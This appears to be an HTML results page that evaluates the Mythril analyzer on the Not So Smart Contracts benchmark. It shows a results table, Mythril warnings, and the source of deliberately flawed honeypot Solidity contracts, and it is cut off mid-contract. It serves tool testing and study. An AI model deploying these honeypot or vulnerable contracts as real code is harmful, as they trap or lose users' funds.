<html>
  <!--- FIXME: put in css -->
  <style>
    table, th, td {
    border: 1px solid #cccccc;
    border-collapse: collapse;
    }

    table {
    font-size: 12px;
    }

    td {
    padding: 5px;
    align: center;
    width: 150px;
    }

    body {
    font-family: "Arial";
    }

    h2 {
    font-size: 1.17em;
    }

    .highlight .hll { background-color: #ffffcc }
    .highlight  { background: #f8f8f8; }
    .highlight .c { color: #408080; font-style: italic } /* Comment */
    .highlight .err { border: 1px solid #FF0000 } /* Error */
    .highlight .k { color: #008000; font-weight: bold } /* Keyword */
    .highlight .o { color: #666666 } /* Operator */
    .highlight .ch { color: #408080; font-style: italic } /* Comment.Hashbang */
    .highlight .cm { color: #408080; font-style: italic } /* Comment.Multiline */
    .highlight .cp { color: #BC7A00 } /* Comment.Preproc */
    .highlight .cpf { color: #408080; font-style: italic } /* Comment.PreprocFile */
    .highlight .c1 { color: #408080; font-style: italic } /* Comment.Single */
    .highlight .cs { color: #408080; font-style: italic } /* Comment.Special */
    .highlight .gd { color: #A00000 } /* Generic.Deleted */
    .highlight .ge { font-style: italic } /* Generic.Emph */
    .highlight .gr { color: #FF0000 } /* Generic.Error */
    .highlight .gh { color: #000080; font-weight: bold } /* Generic.Heading */
    .highlight .gi { color: #00A000 } /* Generic.Inserted */
    .highlight .go { color: #888888 } /* Generic.Output */
    .highlight .gp { color: #000080; font-weight: bold } /* Generic.Prompt */
    .highlight .gs { font-weight: bold } /* Generic.Strong */
    .highlight .gu { color: #800080; font-weight: bold } /* Generic.Subheading */
    .highlight .gt { color: #0044DD } /* Generic.Traceback */
    .highlight .kc { color: #008000; font-weight: bold } /* Keyword.Constant */
    .highlight .kd { color: #008000; font-weight: bold } /* Keyword.Declaration */
    .highlight .kn { color: #008000; font-weight: bold } /* Keyword.Namespace */
    .highlight .kp { color: #008000 } /* Keyword.Pseudo */
    .highlight .kr { color: #008000; font-weight: bold } /* Keyword.Reserved */
    .highlight .kt { color: #B00040 } /* Keyword.Type */
    .highlight .m { color: #666666 } /* Literal.Number */
    .highlight .s { color: #BA2121 } /* Literal.String */
    .highlight .na { color: #7D9029 } /* Name.Attribute */
    .highlight .nb { color: #008000 } /* Name.Builtin */
    .highlight .nc { color: #0000FF; font-weight: bold } /* Name.Class */
    .highlight .no { color: #880000 } /* Name.Constant */
    .highlight .nd { color: #AA22FF } /* Name.Decorator */
    .highlight .ni { color: #999999; font-weight: bold } /* Name.Entity */
    .highlight .ne { color: #D2413A; font-weight: bold } /* Name.Exception */
    .highlight .nf { color: #0000FF } /* Name.Function */
    .highlight .nl { color: #A0A000 } /* Name.Label */
    .highlight .nn { color: #0000FF; font-weight: bold } /* Name.Namespace */
    .highlight .nt { color: #008000; font-weight: bold } /* Name.Tag */
    .highlight .nv { color: #19177C } /* Name.Variable */
    .highlight .ow { color: #AA22FF; font-weight: bold } /* Operator.Word */
    .highlight .w { color: #bbbbbb } /* Text.Whitespace */
    .highlight .mb { color: #666666 } /* Literal.Number.Bin */
    .highlight .mf { color: #666666 } /* Literal.Number.Float */
    .highlight .mh { color: #666666 } /* Literal.Number.Hex */
    .highlight .mi { color: #666666 } /* Literal.Number.Integer */
    .highlight .mo { color: #666666 } /* Literal.Number.Oct */
    .highlight .sa { color: #BA2121 } /* Literal.String.Affix */
    .highlight .sb { color: #BA2121 } /* Literal.String.Backtick */
    .highlight .sc { color: #BA2121 } /* Literal.String.Char */
    .highlight .dl { color: #BA2121 } /* Literal.String.Delimiter */
    .highlight .sd { color: #BA2121; font-style: italic } /* Literal.String.Doc */
    .highlight .s2 { color: #BA2121 } /* Literal.String.Double */
    .highlight .se { color: #BB6622; font-weight: bold } /* Literal.String.Escape */
    .highlight .sh { color: #BA2121 } /* Literal.String.Heredoc */
    .highlight .si { color: #BB6688; font-weight: bold } /* Literal.String.Interpol */
    .highlight .sx { color: #008000 } /* Literal.String.Other */
    .highlight .sr { color: #BB6688 } /* Literal.String.Regex */
    .highlight .s1 { color: #BA2121 } /* Literal.String.Single */
    .highlight .ss { color: #19177C } /* Literal.String.Symbol */
    .highlight .bp { color: #008000 } /* Name.Builtin.Pseudo */
    .highlight .fm { color: #0000FF } /* Name.Function.Magic */
    .highlight .vc { color: #19177C } /* Name.Variable.Class */
    .highlight .vg { color: #19177C } /* Name.Variable.Global */
    .highlight .vi { color: #19177C } /* Name.Variable.Instance */
    .highlight .vm { color: #19177C } /* Name.Variable.Magic */
    .highlight .il { color: #666666 } /* Literal.Number.Integer.Long */
  </style>

  <head>
    <title>Analysis Tool Evaluation for the nssc Benchmark </title>
  </head>
  <body>
    <!--- FIXME: use css better -->
    <h1>Analysis Tool Evaluation for the <a href="https://github.com/trailofbits/not-so-smart-contracts">Not (so) Smart Contracts</a> Benchmark 2018-08-05 08:12:20</h1>

    <p>This page shows the results EVM code analysis tools when run over the <a href="https://github.com/trailofbits/not-so-smart-contracts">Not (so) Smart Contracts</a> benchmark suite.
      The code is <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites">hosted on github</a>.<br>
      Please suggest or contribute more benchmarks or submit
      <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/issues">suggestions or issues</a>.
      <br></p>

    <h2 id="results">Results Chart</h2>

    <p>Green means the tool gives the expected result, yellow means the analysis program
      failed or timed out, and red means it did not.</p>

    <p>Click on the benchmark name to see its Solidity code.</p>

    <p>See the project
    wiki's <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/Terminology">Terminology</a>
      entry for definitions used below.</p>

    <!--- Results as a chart ---->
    <table>
      <tr style="font-weight: bold">
        <td>Bug Type</td>
        <td>Benchmark</td>
        <td colspan="2">
          Mythril
          <br>
          <span style="font-size: 10px">v0.18.11</span>
      </tr>
            <tr>
        <td>honeypots</td>
        <td><a href="#honeypots/GiftBox/GiftBox">honeypots/GiftBox/GiftBox</td>
        <td>1 minute, 22.03 seconds</td>
        <td style="background-color:
            rgba(80, 200, 120, .4)">
	  <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/True-Positive">True Positive</a></td>
	      <tr>
        <td>honeypots</td>
        <td><a href="#honeypots/KOTH/KOTH">honeypots/KOTH/KOTH</td>
        <td> 2.10 seconds</td>
        <td style="background-color:
            rgba(80, 200, 120, .4)">
	  <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/True-Positive">True Positive</a></td>
	      <tr>
        <td>honeypots</td>
        <td><a href="#honeypots/Lottery/Lottery">honeypots/Lottery/Lottery</td>
        <td>50.37 seconds</td>
        <td style="background-color:
            rgba(80, 200, 120, .4)">
	  <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/True-Positive">True Positive</a></td>
	      <tr>
        <td>honeypots</td>
        <td><a href="#honeypots/Multiplicator/Multiplicator">honeypots/Multiplicator/Multiplicator</td>
        <td> 2.01 seconds</td>
        <td style="background-color:
            rgba(80, 200, 120, .4)">
	  <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/True-Positive">True Positive</a></td>
	      <tr>
        <td>honeypots</td>
        <td><a href="#honeypots/PrivateBank/PrivateBank">honeypots/PrivateBank/PrivateBank</td>
        <td>4 minutes,  0.11 seconds</td>
        <td style="background-color:
            rgba(253, 195, 83, .4)">
	  <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/Timed-Out">Timed Out</a></td>
	      <tr>
        <td>honeypots</td>
        <td><a href="#honeypots/VarLoop/VarLoop">honeypots/VarLoop/VarLoop</td>
        <td> 2.39 seconds</td>
        <td style="background-color:
            rgba(80, 200, 120, .4)">
	  <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/True-Positive">True Positive</a></td>
	      <tr>
        <td>Incorrect Interface</td>
        <td><a href="#incorrect_interface/Alice">incorrect_interface/Alice</td>
        <td> 2.16 seconds</td>
        <td style="background-color:
            rgba(80, 200, 120, .4)">
	  <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/True-Positive">True Positive</a></td>
	      <tr>
        <td>Incorrect Interface</td>
        <td><a href="#incorrect_interface/Bob">incorrect_interface/Bob</td>
        <td> 2.24 seconds</td>
        <td style="background-color:
            rgba(80, 200, 120, .4)">
	  <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/True-Positive">True Positive</a></td>
	      <tr>
        <td>Integer Overflow</td>
        <td><a href="#integer_overflow/interger_overflow_1">integer_overflow/interger_overflow_1</td>
        <td> 2.75 seconds</td>
        <td style="background-color:
            rgba(80, 200, 120, .4)">
	  <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/True-Positive">True Positive</a></td>
	      <tr>
        <td>Missing Constructor</td>
        <td><a href="#missing_constructor/Missing">missing_constructor/Missing</td>
        <td> 1.39 seconds</td>
        <td style="background-color:
            rgba(80, 200, 120, .4)">
	  <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/True-Positive">True Positive</a></td>
	      <tr>
        <td>Missing Constructor</td>
        <td><a href="#missing_constructor/Rubixi_source_code/Rubixi">missing_constructor/Rubixi_source_code/Rubixi</td>
        <td> 1.13 seconds</td>
        <td style="background-color:
            rgba(128, 128, 128, .4)">
	  <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/Unconfigured">Unconfigured</a></td>
	      <tr>
        <td>Missing Constructor</td>
        <td><a href="#race_condition/RaceCondition">race_condition/RaceCondition</td>
        <td> 2.94 seconds</td>
        <td style="background-color:
            rgba(80, 200, 120, .4)">
	  <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/True-Positive">True Positive</a></td>
	      <tr>
        <td>Reentrancy</td>
        <td><a href="#reentrancy/DAO_source_code/DAO">reentrancy/DAO_source_code/DAO</td>
        <td> 1.14 seconds</td>
        <td style="background-color:
            rgba(128, 128, 128, .4)">
	  <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/Unconfigured">Unconfigured</a></td>
	      <tr>
        <td>Reentrancy</td>
        <td><a href="#reentrancy/Reentrancy">reentrancy/Reentrancy</td>
        <td> 2.51 seconds</td>
        <td style="background-color:
            rgba(80, 200, 120, .4)">
	  <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/True-Positive">True Positive</a></td>
	      <tr>
        <td>Reentrancy</td>
        <td><a href="#reentrancy/ReentrancyExploit">reentrancy/ReentrancyExploit</td>
        <td> 2.41 seconds</td>
        <td style="background-color:
            rgba(80, 200, 120, .4)">
	  <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/True-Positive">True Positive</a></td>
	      <tr>
        <td>Unchecked External Call</td>
        <td><a href="#unchecked_external_call/KotET_source_code/KingOfTheEtherThrone">unchecked_external_call/KotET_source_code/KingOfTheEtherThrone</td>
        <td> 1.11 seconds</td>
        <td style="background-color:
            rgba(128, 128, 128, .4)">
	  <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/Unconfigured">Unconfigured</a></td>
	      <tr>
        <td>Unprotected Function</td>
        <td><a href="#unprotected_function/Unprotected">unprotected_function/Unprotected</td>
        <td> 2.26 seconds</td>
        <td style="background-color:
            rgba(80, 200, 120, .4)">
	  <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/True-Positive">True Positive</a></td>
	      <tr>
        <td>Unprotected Function</td>
        <td><a href="#unprotected_function/WalletLibrary_source_code/WalletLibrary">unprotected_function/WalletLibrary_source_code/WalletLibrary</td>
        <td> 1.22 seconds</td>
        <td style="background-color:
            rgba(128, 128, 128, .4)">
	  <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/Unconfigured">Unconfigured</a></td>
	      <tr>
        <td>Variable Shadowing</td>
        <td><a href="#variable shadowing/inherited_state">variable shadowing/inherited_state</td>
        <td> 1.33 seconds</td>
        <td style="background-color:
            rgba(80, 200, 120, .4)">
	  <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/True-Positive">True Positive</a></td>
	      </tr>
      <tr>
        <td><b>summary stats</b></td>
        <td>19 tests</td>
        <td>7 minutes, 43.48 seconds</td>
        <td>14 expected, 4 unexpected
	  <!-- <br>
	       
	    -->
	</td>
      </tr>
    </table>

    <!--- breakout per result ---->
    <h2 id="results">Results Details</h2>

        <hr>
    <h3 id=honeypots/GiftBox/GiftBox>
      <a href="https://github.com/trailofbits/not-so-smart-contracts/tree/master//honeypots/GiftBox/GiftBox.sol">honeypots/GiftBox/GiftBox</a>
    </h3>
    <table>
      <tr style="font-weight: bold">
        <td>Bug Type</td>
	          <td colspan="2">
          Mythril
          <br>
          <span style="font-size: 10px">v0.18.11</span>
      </tr>
      <tr>
        <td>honeypots</td>
	        <td style="background-color:
		   rgba(80, 200, 120, .4)">
	  <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/True-Positive">True Positive</a></td>
      </tr>
    </table>
    <h4>Source Code</h4>
    <div class="highlight"><pre><span></span><span class="kr">pragma solidity</span> <span class="o">^</span><span class="mf">0.4</span><span class="p">.</span><span class="mi">19</span><span class="p">;</span>

<span class="kd">contract</span> <span class="n">NEW_YEARS_GIFT</span>
<span class="p">{</span>
    <span class="kt">string</span> <span class="n">message</span><span class="p">;</span>
    
    <span class="kt">bool</span> <span class="n">passHasBeenSet</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
    
    <span class="kt">address</span> <span class="n">sender</span><span class="p">;</span>
    
    <span class="kt">bytes32</span> <span class="kr">public</span> <span class="n">hashPass</span><span class="p">;</span>
	
    <span class="kd">function</span><span class="p">()</span> <span class="kr">public</span> <span class="kr">payable</span><span class="p">{}</span>
    
    <span class="kd">function</span> <span class="n">GetHash</span><span class="p">(</span><span class="kt">bytes</span> <span class="n">pass</span><span class="p">)</span> <span class="kr">public</span> <span class="kr">constant</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bytes32</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="nf">sha3</span><span class="p">(</span><span class="n">pass</span><span class="p">);}</span>
    
    <span class="kd">function</span> <span class="n">SetPass</span><span class="p">(</span><span class="kt">bytes32</span> <span class="n">hash</span><span class="p">)</span>
    <span class="kr">public</span>
    <span class="kr">payable</span>
    <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span> <span class="p">(</span><span class="o">!</span><span class="n">passHasBeenSet</span><span class="o">&amp;&amp;</span><span class="p">(</span><span class="nb">msg.value</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">))</span> <span class="o">||</span> <span class="n">hashPass</span><span class="o">==</span><span class="mh">0x0</span> <span class="p">)</span>
        <span class="p">{</span>
            <span class="n">hashPass</span> <span class="o">=</span> <span class="n">hash</span><span class="p">;</span>
            <span class="n">sender</span> <span class="o">=</span> <span class="nb">msg.sender</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    
    <span class="kd">function</span> <span class="n">SetMessage</span><span class="p">(</span><span class="kt">string</span> <span class="n">_message</span><span class="p">)</span>
    <span class="kr">public</span>
    <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">msg.sender</span><span class="o">==</span><span class="n">sender</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">message</span> <span class="o">=</span><span class="n">_message</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    
    <span class="kd">function</span> <span class="n">GetGift</span><span class="p">(</span><span class="kt">bytes</span> <span class="n">pass</span><span class="p">)</span>
    <span class="kr">external</span>
    <span class="kr">payable</span>
    <span class="k">returns</span> <span class="p">(</span><span class="kt">string</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="n">hashPass</span> <span class="o">==</span> <span class="nf">sha3</span><span class="p">(</span><span class="n">pass</span><span class="p">))</span>
        <span class="p">{</span>
            <span class="nb">msg.sender</span><span class="p">.</span><span class="nf">transfer</span><span class="p">(</span><span class="nb">this</span><span class="p">.</span><span class="nb">balance</span><span class="p">);</span>
            <span class="k">return</span> <span class="n">message</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    
    <span class="kd">function</span> <span class="n">Revoce</span><span class="p">()</span>
    <span class="kr">public</span>
    <span class="kr">payable</span>
    <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">msg.sender</span><span class="o">==</span><span class="n">sender</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">sender</span><span class="p">.</span><span class="nf">transfer</span><span class="p">(</span><span class="nb">this</span><span class="p">.</span><span class="nb">balance</span><span class="p">);</span>
            <span class="n">message</span><span class="o">=</span><span class="s">&quot;&quot;</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    
    <span class="kd">function</span> <span class="n">PassHasBeenSet</span><span class="p">(</span><span class="kt">bytes32</span> <span class="n">hash</span><span class="p">)</span>
    <span class="kr">public</span>
    <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">msg.sender</span><span class="o">==</span><span class="n">sender</span><span class="o">&amp;&amp;</span><span class="n">hash</span><span class="o">==</span><span class="n">hashPass</span><span class="p">)</span>
        <span class="p">{</span>
           <span class="n">passHasBeenSet</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>

          <h4>Mythril Report</h4>
                          <h5>Location</h5>
           <pre>Line 37: function GetGift(bytes pass)
    external
    payable
    returns (string)
    {
        if(hashPass == sha3(pass))
        {
            msg.sender.transfer(this.balance);
            return message;
        }
    }</pre>
                  <h5>Issue Integer Overflow (Warning)</h5>
         A possible integer overflow exists in the function `GetGift(bytes)`.
The addition or multiplication may result in a value higher than the maximum representable integer.
                          <h5>Location</h5>
           <pre>Line 28: function SetMessage(string _message)
    public
    {
        if(msg.sender==sender)
        {
            message =_message;
        }
    }</pre>
                  <h5>Issue Integer Overflow (Warning)</h5>
         A possible integer overflow exists in the function `SetMessage(string)`.
The addition or multiplication may result in a value higher than the maximum representable integer.
                          <h5>Location</h5>
           <pre>Line 15: function GetHash(bytes pass) public constant returns (bytes32) {return sha3(pass);}</pre>
                  <h5>Issue Integer Overflow (Warning)</h5>
         A possible integer overflow exists in the function `GetHash(bytes)`.
The addition or multiplication may result in a value higher than the maximum representable integer.
                          <h5>Location</h5>
           <pre>Line 42: sha3(pass)</pre>
                  <h5>Issue Integer Overflow (Warning)</h5>
         A possible integer overflow exists in the function `GetGift(bytes)`.
The addition or multiplication may result in a value higher than the maximum representable integer.
                          <h5>Location</h5>
           <pre>Line 42: sha3(pass)</pre>
                  <h5>Issue Integer Underflow (Warning)</h5>
         A possible integer underflow exists in the function `GetGift(bytes)`.
The subtraction may result in a value &lt; 0.
                          <h5>Location</h5>
           <pre>Line 44: msg.sender.transfer(this.balance)</pre>
                  <h5>Issue Ether send (Warning)</h5>
         In the function `GetGift(bytes)` a non-zero amount of Ether is sent to msg.sender.

There is a check on storage index 2. This storage slot can be written to by calling the function `SetPass(bytes32)`.
                          <h5>Location</h5>
           <pre>Line 55: sender.transfer(this.balance)</pre>
                  <h5>Issue Ether send (Warning)</h5>
         In the function `Revoce()` a non-zero amount of Ether is sent to an address taken from storage slot 1.
There is a check on storage index 1. This storage slot can be written to by calling the function `SetPass(bytes32)`.

There is a check on storage index 1. This storage slot can be written to by calling the function `SetPass(bytes32)`.
                          <h5>Location</h5>
           <pre>Line 55: sender.transfer(this.balance)</pre>
                  <h5>Issue Transaction order dependence (Warning)</h5>
         A possible transaction order independence vulnerability exists in function Revoce(). The value or direction of the call statement is determined from a tainted storage location
                          <h5>Location</h5>
           <pre>Line 3: contract NEW_YEARS_GIFT
{
    string message;
    
    bool passHasBeenSet = false;
    
    address sender;
    
    bytes32 public hashPass;
	
    function() public payable{}
    
    function GetHash(bytes pass) public constant returns (bytes32) {return sha3(pass);}
    
    function SetPass(bytes32 hash)
    public
    payable
    {
        if( (!passHasBeenSet&amp;&amp;(msg.value &gt; 1 ether)) || hashPass==0x0 )
        {
            hashPass = hash;
            sender = msg.sender;
        }
    }
    
    function SetMessage(string _message)
    public
    {
        if(msg.sender==sender)
        {
            message =_message;
        }
    }
    
    function GetGift(bytes pass)
    external
    payable
    returns (string)
    {
        if(hashPass == sha3(pass))
        {
            msg.sender.transfer(this.balance);
            return message;
        }
    }
    
    function Revoce()
    public
    payable
    {
        if(msg.sender==sender)
        {
            sender.transfer(this.balance);
            message=&#34;&#34;;
        }
    }
    
    function PassHasBeenSet(bytes32 hash)
    public
    {
        if(msg.sender==sender&amp;&amp;hash==hashPass)
        {
           passHasBeenSet=true;
        }
    }
}</pre>
                  <h5>Issue Integer Overflow (Warning)</h5>
         A possible integer overflow exists in the function `SetMessage(string)`.
The addition or multiplication may result in a value higher than the maximum representable integer.
                          <h5>Location</h5>
           <pre>Line 3: contract NEW_YEARS_GIFT
{
    string message;
    
    bool passHasBeenSet = false;
    
    address sender;
    
    bytes32 public hashPass;
	
    function() public payable{}
    
    function GetHash(bytes pass) public constant returns (bytes32) {return sha3(pass);}
    
    function SetPass(bytes32 hash)
    public
    payable
    {
        if( (!passHasBeenSet&amp;&amp;(msg.value &gt; 1 ether)) || hashPass==0x0 )
        {
            hashPass = hash;
            sender = msg.sender;
        }
    }
    
    function SetMessage(string _message)
    public
    {
        if(msg.sender==sender)
        {
            message =_message;
        }
    }
    
    function GetGift(bytes pass)
    external
    payable
    returns (string)
    {
        if(hashPass == sha3(pass))
        {
            msg.sender.transfer(this.balance);
            return message;
        }
    }
    
    function Revoce()
    public
    payable
    {
        if(msg.sender==sender)
        {
            sender.transfer(this.balance);
            message=&#34;&#34;;
        }
    }
    
    function PassHasBeenSet(bytes32 hash)
    public
    {
        if(msg.sender==sender&amp;&amp;hash==hashPass)
        {
           passHasBeenSet=true;
        }
    }
}</pre>
                  <h5>Issue Integer Overflow (Warning)</h5>
         A possible integer overflow exists in the function `SetMessage(string)`.
The addition or multiplication may result in a value higher than the maximum representable integer.
                <hr>
    <h3 id=honeypots/KOTH/KOTH>
      <a href="https://github.com/trailofbits/not-so-smart-contracts/tree/master//honeypots/KOTH/KOTH.sol">honeypots/KOTH/KOTH</a>
    </h3>
    <table>
      <tr style="font-weight: bold">
        <td>Bug Type</td>
	          <td colspan="2">
          Mythril
          <br>
          <span style="font-size: 10px">v0.18.11</span>
      </tr>
      <tr>
        <td>honeypots</td>
	        <td style="background-color:
		   rgba(80, 200, 120, .4)">
	  <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/True-Positive">True Positive</a></td>
      </tr>
    </table>
    <h4>Source Code</h4>
    <div class="highlight"><pre><span></span><span class="kr">pragma solidity</span> <span class="o">^</span><span class="mf">0.4</span><span class="p">.</span><span class="mi">19</span><span class="p">;</span>
<span class="c1">//</span>
<span class="c1">//Live TEST ---- Please Do NOT use! Thanks! ----</span>
<span class="c1">//</span>
<span class="kd">contract</span> <span class="n">Ownable</span> <span class="p">{</span>
    <span class="kt">address</span> <span class="kr">public</span> <span class="n">owner</span><span class="p">;</span>
    <span class="kd">function</span> <span class="n">Ownable</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span><span class="n">owner</span> <span class="o">=</span> <span class="nb">msg.sender</span><span class="p">;}</span>
    <span class="kd">modifier</span> <span class="n">onlyOwner</span><span class="p">()</span> <span class="p">{</span><span class="nf">require</span><span class="p">(</span><span class="nb">msg.sender</span> <span class="o">==</span> <span class="n">owner</span><span class="p">);</span> <span class="kr">_</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="c1">//CEO Throne .. The CEO with the highest stake gets the control over the contract</span>
<span class="c1">//msg.value needs to be higher than largestStake when calling Stake()</span>

<span class="kd">contract</span> <span class="n">CEOThrone</span> <span class="kr">is</span> <span class="n">Ownable</span> <span class="p">{</span>
    <span class="kt">address</span> <span class="kr">public</span> <span class="n">owner</span><span class="p">;</span>
    <span class="kt">uint</span> <span class="kr">public</span> <span class="n">largestStake</span><span class="p">;</span>
<span class="c1">// Stake() function being called with 0xde20bc92 and ETH :: recommended gas limit 35.000</span>
<span class="c1">// The sent ETH is checked against largestStake</span>
    <span class="kd">function</span> <span class="n">Stake</span><span class="p">()</span> <span class="kr">public</span> <span class="kr">payable</span> <span class="p">{</span>
        <span class="c1">// if you own the largest stake in a company, you own a company</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">msg.value</span> <span class="o">&gt;</span> <span class="n">largestStake</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">owner</span> <span class="o">=</span> <span class="nb">msg.sender</span><span class="p">;</span>
            <span class="n">largestStake</span> <span class="o">=</span> <span class="nb">msg.value</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="c1">// withdraw() function being called with 0x3ccfd60b :: recommened gas limit 30.000</span>
    <span class="kd">function</span> <span class="n">withdraw</span><span class="p">()</span> <span class="kr">public</span> <span class="n">onlyOwner</span> <span class="p">{</span>
        <span class="c1">// only owner can withdraw funds</span>
        <span class="nb">msg.sender</span><span class="p">.</span><span class="nf">transfer</span><span class="p">(</span><span class="nb">this</span><span class="p">.</span><span class="nb">balance</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>

          <hr>
    <h3 id=honeypots/Lottery/Lottery>
      <a href="https://github.com/trailofbits/not-so-smart-contracts/tree/master//honeypots/Lottery/Lottery.sol">honeypots/Lottery/Lottery</a>
    </h3>
    <table>
      <tr style="font-weight: bold">
        <td>Bug Type</td>
	          <td colspan="2">
          Mythril
          <br>
          <span style="font-size: 10px">v0.18.11</span>
      </tr>
      <tr>
        <td>honeypots</td>
	        <td style="background-color:
		   rgba(80, 200, 120, .4)">
	  <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/True-Positive">True Positive</a></td>
      </tr>
    </table>
    <h4>Source Code</h4>
    <div class="highlight"><pre><span></span><span class="cm">/*</span>
<span class="cm"> * This is a distributed lottery that chooses random addresses as lucky addresses. If these</span>
<span class="cm"> * participate, they get the jackpot: 7 times the price of their bet.</span>
<span class="cm"> * Of course one address can only win once. The owner regularly reseeds the secret</span>
<span class="cm"> * seed of the contract (based on which the lucky addresses are chosen), so if you did not win,</span>
<span class="cm"> * just wait for a reseed and try again!</span>
<span class="cm"> *</span>
<span class="cm"> * Jackpot chance:   1 in 8</span>
<span class="cm"> * Ticket price: Anything larger than (or equal to) 0.1 ETH</span>
<span class="cm"> * Jackpot size: 7 times the ticket price</span>
<span class="cm"> *</span>
<span class="cm"> * HOW TO PARTICIPATE: Just send any amount greater than (or equal to) 0.1 ETH to the contract&#39;s address</span>
<span class="cm"> * Keep in mind that your address can only win once</span>
<span class="cm"> *</span>
<span class="cm"> * If the contract doesn&#39;t have enough ETH to pay the jackpot, it sends the whole balance.</span>
<span class="cm">*/</span>

<span class="kd">contract</span> <span class="n">OpenAddressLottery</span><span class="p">{</span>
    <span class="kd">struct</span> <span class="n">SeedComponents</span><span class="p">{</span>
        <span class="kt">uint</span> <span class="n">component1</span><span class="p">;</span>
        <span class="kt">uint</span> <span class="n">component2</span><span class="p">;</span>
        <span class="kt">uint</span> <span class="n">component3</span><span class="p">;</span>
        <span class="kt">uint</span> <span class="n">component4</span><span class="p">;</span>
    <span class="p">}</span>
    
    <span class="kt">address</span> <span class="n">owner</span><span class="p">;</span> <span class="c1">//address of the owner</span>
    <span class="kt">uint</span> <span class="kr">private</span> <span class="n">secretSeed</span><span class="p">;</span> <span class="c1">//seed used to calculate number of an address</span>
    <span class="kt">uint</span> <span class="kr">private</span> <span class="n">lastReseed</span><span class="p">;</span> <span class="c1">//last reseed - used to automatically reseed the contract every 1000 blocks</span>
    <span class="kt">uint</span> <span class="n">LuckyNumber</span> <span class="o">=</span> <span class="mi">7</span><span class="p">;</span> <span class="c1">//if the number of an address equals 7, it wins</span>
        
    <span class="kd">mapping</span> <span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">bool</span><span class="p">)</span> <span class="n">winner</span><span class="p">;</span> <span class="c1">//keeping track of addresses that have already won</span>
    
    <span class="kd">function</span> <span class="n">OpenAddressLottery</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">owner</span> <span class="o">=</span> <span class="nb">msg.sender</span><span class="p">;</span>
        <span class="n">reseed</span><span class="p">(</span><span class="n">SeedComponents</span><span class="p">((</span><span class="kt">uint</span><span class="p">)(</span><span class="nb">block.coinbase</span><span class="p">),</span> <span class="nb">block.difficulty</span><span class="p">,</span> <span class="nb">block.gaslimit</span><span class="p">,</span> <span class="nb">block.timestamp</span><span class="p">));</span> <span class="c1">//generate a quality random seed</span>
    <span class="p">}</span>
    
    <span class="kd">function</span> <span class="n">participate</span><span class="p">()</span> <span class="kr">payable</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">msg.value</span><span class="o">&lt;</span><span class="mf">0.1</span> <span class="kc">ether</span><span class="p">)</span>
            <span class="k">return</span><span class="p">;</span> <span class="c1">//verify ticket price</span>
        
        <span class="c1">// make sure he hasn&#39;t won already</span>
        <span class="nf">require</span><span class="p">(</span><span class="n">winner</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">]</span> <span class="o">==</span> <span class="kc">false</span><span class="p">);</span>
        
